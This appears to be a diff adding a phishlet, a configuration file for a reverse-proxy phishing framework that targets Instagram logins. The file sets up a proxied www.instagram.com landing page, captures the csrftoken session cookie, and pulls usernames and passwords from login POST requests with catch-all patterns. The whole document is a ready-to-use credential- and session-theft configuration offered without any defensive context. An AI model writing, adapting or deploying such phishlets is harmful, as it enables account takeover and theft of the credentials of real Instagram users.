@@ -1,0 +1,29 @@
+name: 'instagram'
+author: '@panda'
+min_ver: '3.2.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com', session: true, is_landing: true}
+auth_tokens:
+  - domain: '.instagram.com'
+    keys:
+      - 'csrftoken'
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'pass'
+    search: '(.*)'
+    type: 'post'
+auth_urls:
+  - '/accounts/login/'
+login:
+  domain: 'www.instagram.com'
+  path: '/accounts/login/'
+force_post:
+  - path: '/accounts/login/'
+    search:
+      - {key: 'email', search: '(.*)'}
+      - {key: 'pass', search: '(.*)'}
+    type: 'post'
